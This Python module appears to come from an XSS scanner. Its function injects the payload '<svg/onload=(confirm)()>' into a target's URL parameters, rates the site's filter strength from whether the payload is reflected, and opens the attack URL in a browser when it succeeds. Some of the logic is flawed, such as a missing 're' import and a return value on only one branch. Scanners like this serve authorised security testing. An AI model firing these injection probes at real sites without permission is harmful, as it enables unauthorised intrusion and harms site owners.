from core.make_request import make_request
from urllib.parse import quote_plus
from time import sleep
import webbrowser

#Colors and shit like that
white = '\033[97m'
green = '\033[92m'
red = '\033[91m'
yellow = '\033[93m'
end = '\033[0m'
back = '\033[7;91m'
info = '\033[93m[!]\033[0m'
que = '\033[94m[?]\033[0m'
bad = '\033[91m[-]\033[0m'
good = '\033[32m[+]\033[0m'
run = '\033[97m[~]\033[0m'

def filter_checker(url, param_data, method, delay, xsschecker, cookie):
    strength = '' # A variable for containing strength of the filter
    # Injecting a malicious payload first by replacing xsschecker with our payload
    try:
        low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
        sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
        low_request = make_request(url, low_string, method, cookie)
        if '<svg/onload=(confirm)()>' in low_request: # If payload was reflected in response
            print("%s Filter Strength : %sLow or None%s" % (good, green, end))
            print('%s Payload: <svg/onload=(confirm)()>' % good)
            print('%s Efficiency: 100%%' % good)
            choice = input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
            if choice == 'y':
                pass
            else:
                if method == 'GET':
                    webbrowser.open(url + param_data.strip(xsschecker)+'<svg/onload=(confirm)()>')
                    quit()
            strength = 'low' # As a malicious payload was not filtered, the filter is weak
        else: # If malicious payload was filtered (was not in the response)
            # Now we will use a less malicious payload
            medium_string = param_data.replace(xsschecker, quote_plus('<zz onxx=yy>'))
            sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
            medium_request = make_request(url, medium_string, method, cookie)
            if '<zz onxx=yy>' in medium_request:
                print('%s Filter Strength : %sMedium%s' % (info, yellow, end))
                strength = 'medium'
            else: #Printing high since result was not medium/low
                print('%s Filter Strength : %sHigh%s' % (bad, red, end))
                strength = 'high'
            return strength
    except Exception as e:
        print (e)
        try:
            print('%s Target doesn\'t seem to respond properly. Error Code: %s' % (bad, re.search(r'\d\d\d', str(e)).group()))
        except:
            print('%s Target doesn\'t seem to respond properly.' % bad)